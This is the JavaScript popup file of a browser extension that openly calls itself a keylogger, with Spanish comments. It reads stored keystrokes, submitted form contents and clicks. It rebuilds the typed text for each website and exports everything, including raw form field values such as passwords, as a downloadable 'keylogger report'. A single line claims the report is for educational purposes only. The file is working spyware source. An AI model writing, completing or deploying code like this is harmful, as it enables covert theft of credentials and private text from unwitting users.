// popup.js - Lógica del panel de control (Cyberpunk + TXT)

if (typeof browser === "undefined") {
    var browser = chrome;
}

document.addEventListener('DOMContentLoaded', function() {
    updateCounts();
    
    document.getElementById('exportData').addEventListener('click', exportData);
    document.getElementById('clearData').addEventListener('click', clearAllData);
});

function displayStatus(message, isSuccess) {
    const statusElement = document.getElementById('statusMessage');
    statusElement.textContent = message;
    statusElement.style.color = isSuccess ? '#00ff41' : '#ff0000';
    
    setTimeout(() => {
        statusElement.textContent = '';
    }, 3000);
}

function updateCounts() {
    browser.storage.local.get(['keystrokes', 'forms', 'clicks'], function(result) {
        document.getElementById('keystrokesCount').textContent = result.keystrokes?.length || 0;
        document.getElementById('formsCount').textContent = result.forms?.length || 0;
        document.getElementById('clicksCount').textContent = result.clicks?.length || 0;
    });
}

function exportData() {
    try {
        browser.storage.local.get(null, function(data) {
            let txtReport = '='.repeat(70) + '\n';
            txtReport += '         REPORTE DE KEYLOGGER\n';
            txtReport += '='.repeat(70) + '\n';
            txtReport += `Fecha de generación: ${new Date().toLocaleString()}\n`;
            
            // Esta parte ya estaba bien arreglada:
            txtReport += `Total de teclas capturadas: ${data.keystrokes?.length || 0}\n`;
            txtReport += `Total de formularios: ${data.forms?.length || 0}\n`;
            txtReport += `Total de clicks: ${data.clicks?.length || 0}\n`;
            txtReport += '='.repeat(70) + '\n\n';
            
            if (data.keystrokes && data.keystrokes.length > 0) {
                txtReport += '📝 TECLAS CAPTURADAS POR SITIO WEB:\n';
                txtReport += '-'.repeat(70) + '\n\n';
                
                const groupedByUrl = {};
                data.keystrokes.forEach(k => {
                    const url = k.url || 'URL desconocida';
                    if (!groupedByUrl[url]) {
                        groupedByUrl[url] = [];
                    }
                    groupedByUrl[url].push(k);
                });
                
                Object.keys(groupedByUrl).forEach(url => {
                    const keys = groupedByUrl[url];
                    let domain = 'N/A';
                    
                    // ARREGLO 1: Capturar URLs inválidas
                    try {
                        domain = new URL(url).hostname;
                    } catch (e) {
                        domain = 'URL interna o inválida';
                    }

                    txtReport += `🌐 SITIO: ${domain}\n`;
                    txtReport += `   URL completa: ${url}\n`;
                    txtReport += `   Teclas capturadas: ${keys.length}\n`;
                    txtReport += `   Hora: ${new Date(keys[0].timestamp).toLocaleString()}\n`;
                    txtReport += '\n   Texto capturado:\n   ';
                    
                    let text = '';
                    keys.forEach(k => {
                        // ARREGLO 2: Capturar teclas nulas (de tu screenshot)
                        if (k && k.key) {
                            if (k.key.length === 1) {
                                text += k.key;
                            } else if (k.key === 'Space') {
                                text += ' ';
                            } else if (k.key === 'Enter') {
                                text += '\n   ';
                            } else if (k.key === 'Backspace') {
                                text = text.slice(0, -1);
                            } else {
                                text += `[${k.key}]`;
                            }
                        } else {
                            text += `[TECLA_NULA]`;
                        }
                    });
                    
                    txtReport += text + '\n\n';
                    txtReport += '-'.repeat(70) + '\n\n';
                });
            }
            
            if (data.forms && data.forms.length > 0) {
                txtReport += '\n📋 FORMULARIOS ENVIADOS:\n';
                txtReport += '-'.repeat(70) + '\n\n';
                
                data.forms.forEach((form, index) => {
                    let domain = 'N/A';
                    
                    try {
                        domain = new URL(form.url).hostname;
                    } catch (e) {
                        domain = 'URL interna o inválida';
                    }

                    txtReport += `Formulario #${index + 1}\n`;
                    txtReport += `Sitio: ${domain}\n`;
                    txtReport += `Hora: ${new Date(form.timestamp).toLocaleString()}\n`;
                    txtReport += `Datos:\n`;
                    Object.keys(form.formData).forEach(key => {
                        txtReport += `  - ${key}: ${form.formData[key]}\n`;
                    });
                    txtReport += '\n';
                });
            }
            
            txtReport += '\n' + '='.repeat(70) + '\n';
            txtReport += '⚠️  Este reporte es solo para fines educativos\n';
            txtReport += '='.repeat(70) + '\n';
            
            const blob = new Blob(['\uFEFF' + txtReport], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `keylogger_reporte_${Date.now()}.txt`;
            
            a.click();
            URL.revokeObjectURL(url); // <-- Esto limpia la memoria

            displayStatus('_REPORT_EXPORTED_', true);
        });
    } catch (e) {
        displayStatus('ERROR: ' + e.message, false);
        console.error("Error al exportar:", e);
    }
}

function clearAllData() {
    if (confirm('// CONFIRMAR PURGA DE DATOS //\n\n¿Seguro que quieres borrar todos los datos capturados? Esta acción es irreversible.')) {
        // Se usa 'browser' para Opera/Chrome
        browser.storage.local.clear(function() {
            updateCounts(); // Actualiza contadores a 0
            displayStatus('_LOGS_CLEARED_', true);
        });
    }
}